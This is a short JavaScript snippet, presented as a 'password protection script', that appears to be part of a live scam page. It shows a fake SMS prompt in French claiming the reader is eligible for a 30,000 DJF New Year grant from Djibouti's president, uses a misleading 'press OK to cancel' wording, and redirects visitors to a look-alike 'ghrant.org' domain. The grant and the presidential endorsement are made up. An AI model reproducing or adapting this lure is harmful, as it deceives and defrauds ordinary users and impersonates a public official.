  
/* Password Protection Script by www.onlineofferz.xyz*/
var password = 'RETIRER 30 000 DJF'
password = prompt(
  'SMS: Félicitations ! Vous êtes éligible à la bourse de Nouvel An de 30 000 DJF du président Ismail Omar Guelleh. Veuillez appuyer sur OK pour annuler..',
  'RETIRER 30 000 DJF'
);
if (password != 'RETIRER 30 000 DJF') {
  location.href = 'https://ghrant.org/grant-djibouti';
}
